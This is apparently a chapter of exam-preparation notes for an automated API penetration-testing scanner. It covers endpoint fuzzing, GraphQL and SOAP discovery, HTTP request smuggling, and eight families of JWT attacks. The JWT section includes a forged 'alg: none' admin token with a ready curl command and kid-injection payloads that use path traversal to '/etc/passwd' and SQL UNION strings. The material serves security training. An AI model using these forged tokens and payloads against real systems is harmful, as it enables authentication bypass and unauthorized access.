# 10. Automation with C-APIPen Scanner

## Quick Start Commands

```bash
# 1. Test connectivity with the target
curl -s -o /dev/null -w "%{http_code}" https://$TARGET_HOST

# 2. Discovery mode ‚Äî without documentation, full fuzzing
python3 capipen_automate.py --host https://$TARGET_HOST

# 3. Swagger mode ‚Äî targeted attack with OpenAPI specification
python3 capipen_automate.py --host https://$TARGET_HOST --swagger-url /swagger.json

# 4. Swagger + JWT (auto-extracted from swagger if exists) + verbose
python3 capipen_automate.py --host https://$TARGET_HOST --swagger-url /swagger.json --verbose

# 5. Swagger + explicit JWT + Burp proxy + verbose (full debug mode)
python3 capipen_automate.py \
  --host https://$TARGET_HOST \
  --swagger-url /swagger.json \
  --credentials "<JWT_from_exam>" \
  --proxy http://127.0.0.1:8080 \
  -v
```

| Class | Responsibility |
|-------|----------------|
| `ScanState` | Global scan state: endpoints, flags, findings, technologies |
| `AttackMatrix` | CSV registry of each attack: endpoint, payload, status, flags |
| `ResponseAnalyzer` | Analyzes body+headers searching for SQL errors, stack traces, sensitive data, version leaks, CORS |

| `ResponseCacher` | Caches HTTP responses (up to 300 files) |

### Operation Modes

| Mode | Activation | Behavior |
|------|-----------|---------|
| **Swagger** | `--swagger-url <path>` | Loads specification, extracts JWT if exists, attacks ONLY valid swagger endpoints with payloads directed by schema of each parameter |
| **Discovery** | Only `--host` | ffuf fuzzing, adds common endpoints, version/verb fuzzing, expanded generic payloads |

## 10.3 Execution Pipeline (Phases 1‚Üí3d)

### Phase 1: Endpoint Discovery

**What it does:** Searches for OpenAPI/Swagger documentation in common paths, runs ffuf to discover hidden routes, adds common API endpoints.

**Documentation paths tested:**
```
/swagger.json, /swagger-ui.html, /api-docs, /v1/api-docs, /v2/api-docs,
/openapi.json, /openapi.yaml, /openapi.yml, /api/v1/swagger.json
```

**Common endpoints added:**
```
/api, /api/v1, /api/v2, /api/v3, /api/users, /api/login, /, ""
```

**Referenced code:** `discover_endpoints()` line 910, `_ffuf_discover_endpoints()` line 1034, `_add_common_endpoints()` line 906.

**Output example:**
```
[*] Phase 1: Endpoint discovery...
    GET /swagger.json ‚Üí 404
    GET /swagger-ui.html ‚Üí 404
    GET /api-docs ‚Üí 404
    GET /api/ ‚Üí 401
    GET /api ‚Üí 301
```

### Phase 2a: GraphQL Discovery

**What it does:** Tests 6 common GraphQL paths with an introspection query (`__schema { types { name } }`).

**Paths tested:**

**Referenced code:** `_discover_graphql_endpoint()` line 987, `_execute_graphql_introspection()`.

**Output example:**

```
    POST /api/graphql ‚Üí 404
    POST /graph ‚Üí 404
```

### Phase 2b: SOAP/WSDL Discovery

**What it does:** Searches for SOAP/WSDL endpoints in 5 paths.

**Paths tested:**

**Referenced code:** `_attack_soap_wsdl()` line 1724

### Phase 2d: Version Fuzzing

**What it does:** Adds versioning candidates to the set of discovered endpoints (only in discovery mode).

**Versions tested:**
```
/v1, /v2, /v3, /v0, /beta, /dev, /staging
```

### Phase 2e: Verb Fuzzing

**What it does:** In discovery mode, tests alternative HTTP methods (POST, PUT, DELETE, PATCH, OPTIONS, HEAD) on each valid endpoint.

**Referenced code:** `_filter_valid_endpoints()` line 1079

**Output example:**
```

  [‚úì] /api ‚Üí 200 (POST)
  [‚úì] /api ‚Üí 200 (PUT)
```

### Phase 3: Endpoint Filtering

**What it does:** Tests each candidate endpoint with GET. If it responds 2xx/3xx, it moves to `valid_endpoints`.

**Referenced code:** `_filter_valid_endpoints()` line 1079

**Output example:**

### Phase 3b: Attack Engine

**What it does:** For each valid endpoint, executes expanded generic payloads + specialized attack modules. See section 10.4.

**Referenced code:** `execute_payloads_on_endpoints()` line 1128

### Phase 3c: HTTP Request Smuggling

**What it does:** Sends 3 smuggling variants against the root host.

**Tests sent:**
- **CL.TE:** `Content-Length: 13` + `Transfer-Encoding: chunked`
- **TE.CL:** `Transfer-Encoding: chunked` + `Content-Length: 4`
- **CL-CL:** Double `Content-Length`

**Referenced code:** `_attack_smuggling()` line 1809

### Phase 3d: SOAP/WSDL Discovery (complement)

**What it does:** Second pass WSDL detection, independent of valid endpoints.

## 10.5 JWT Attacks ‚Äî 8 Sub-families

Automatically executed if `--credentials` contains a valid JWT (starts with `eyJ`). No external libraries ‚Äî uses `base64.urlsafe_b64encode()` + `hmac` + `hashlib` built-in.

### Attack 1: `alg: none`

**Header:** `{"alg": "none", "typ": "JWT"}`
**Payload:** `{"role": "admin", "is_admin": true, "sub": "admin"}`
**JWT generated:**
```
eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJyb2xlIjogImFkbWluIiwgImlzX2FkbWluIjogdHJ1ZSwgInN1YiI6ICJhZG1pbiJ9.
```
**curl generated:**
```bash
curl -sS -L -i -k -X GET "https://$TARGET_HOST/api/endpoint" \
  -H "Authorization: Bearer eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJyb2xlIjogImFkbWluIiwgImlzX2FkbWluIjogdHJ1ZSwgInN1YiI6ICJhZG1pbiJ9."
```
**Variants:** `none`, `None`, `NONE`, `nOnE`, `null`, `Null` (6 total)
**Code:** `_attack_auth_jwt()` line 1577

### Attack 2: `kid` Injection

**Header:** `{"alg": "HS256", "typ": "JWT", "kid": "../../../dev/null"}`
**Payload:** `{"role": "admin", "is_admin": true, "sub": "admin"}`
**Signature:** HMAC-SHA256 using the `kid` value as secret
**Variants of `kid` (7 total):**
```
../../../dev/null, ../../../etc/passwd, /proc/sys/kernel/random/uuid,
1' UNION SELECT 'secret'--, 1' UNION SELECT 'public'--, keyfile, ""
```
**Code:** `_attack_auth_jwt()` line 1602

### Attack 3: Algorithm Confusion RS256‚ÜíHS256

**What it does:** If the original JWT uses `alg: RS256`, try discovering the public key from 5 endpoints:
```
/.well-known/jwks.json, /jwks.json, /api/jwks,
/.well-known/openid-configuration, /openid-configuration
```
If it finds a JWKS, extracts the RSA module (`n`) and uses it as HMAC secret to sign an HS256 with admin payload.

## 10.7 Exam Strategy with the Scanner

### Timeboxing with Scanner

```
[00:00 - 00:03]  Launch scanner in DISCOVERY MODE:
                  python3 capipen_automate.py --host https://$TARGET_HOST

[00:00 - 00:03]  SIMULTANEOUSLY (second terminal), launch swagger mode if URL:
                  python3 capipen_automate.py \
                    --host https://$TARGET_HOST \
                    --swagger-url /swagger.json \
                    --credentials "<JWT_from_exam>"

[00:03 - 00:10]  Parse report.md from first scan:
                  - Did it find flags automatically?
                  - Valid endpoints?
                  - Critical findings? (SQLi, JWT bypass, version leaks)
                  - GraphQL or WSDL discovered?

[00:10 - 03:30]  Complementary manual attacks:
                  - sqlmap on parameters with SQLi hint
                  - jwt_tool for finer JWT attacks (when scanner
                    finds a partial bypass)
                  - Burp Repeater for complex IDORs
                  - kiterunner for routes not discovered by ffuf
                  - Arjun for hidden parameters

[03:30 - 04:00]  Retests and verification of missing flags
[04:00 - 04:15]  Final flag submission
```

### When to Use Each Mode

| Situation | Mode | Reason |
|-----------|------|--------|
| You have swagger URL | `--swagger-url` | Targeted attacks with schema, payloads by parameter type |
| Only have the host | Discovery (no flag) | Complete fuzzing + generic payloads |
| Swagger is authenticated | `--swagger-url` + `--credentials` | Extract JWT from swagger or use it explicitly |
| Want to inspect traffic | `--proxy http://127.0.0.1:8080` | All passes through Burp Suite |
| Target is slow | `--concurrency 1` | Reduce workers to avoid rate limiting |
| Target is fast | `--concurrency 10` | Maximize speed |

### 300 Request Budget ‚Äî Distribution

```
Discovery (swagger paths, ffuf, graphql, soap):           ~45
Filtering (GET endpoints + verb fuzzing):                 ~20
Generic payloads (GET/POST/PUT):                        ~135
Attack Engine (JWT, auth, authorization, ssrf, etc.):     ~55
Smuggling + SOAP + GraphQL extra:                         ~15
RESERVE (for contingencies):                             ~30
                                                        ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
                                                Total:  ~300
```

### Result Interpretation

| Signal in report.md | What it means | Action |
|---------------------|--------------|--------|
| `[version_leak] Apache/2.4.52` | Apache server, possible known vulnerability | Search for CVE of that version |
| `[sql_error] SQL syntax` | Endpoint vulnerable to SQLi | Run sqlmap manually |
